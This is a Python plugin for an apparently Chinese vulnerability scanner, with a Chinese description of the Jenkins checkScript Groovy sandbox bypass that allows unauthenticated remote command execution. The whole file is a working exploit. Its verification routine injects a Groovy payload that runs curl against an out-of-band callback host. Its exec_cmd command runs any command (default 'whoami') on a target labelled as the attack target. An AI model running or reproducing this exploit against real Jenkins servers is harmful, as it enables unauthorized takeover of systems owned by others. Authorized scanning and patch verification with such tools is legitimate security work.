# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Jenkins checkScript 远程命令执行漏洞",
        "description": "Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令",
        "references": ["-"],
    }

    def url(self) -> dict:
        with self.echo_query() as execute:
            subdomain = execute.get_subdomain()
            cmd = f"ping -nc 1 {subdomain}"
            cmd = f"curl http://{subdomain}"
            self.request(
                method='get',
                path='./securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript',
                timeout=10,
                params={
                    'sandbox': True,
                    'value': f'public class x{{public x(){{new String("{cmd}").execute()}}}}'
                }
            )
            if execute.verify():
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='get',
            path=urllib.parse.urljoin(url, './securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'),
            timeout=7,
            params={
                'sandbox': True,
                'value': f'public class x{{public x(){{new String("{cmd}").execute()}}}}'
            }
        )
        if r.status_code == 200:
            self.log.info('命令无回显')
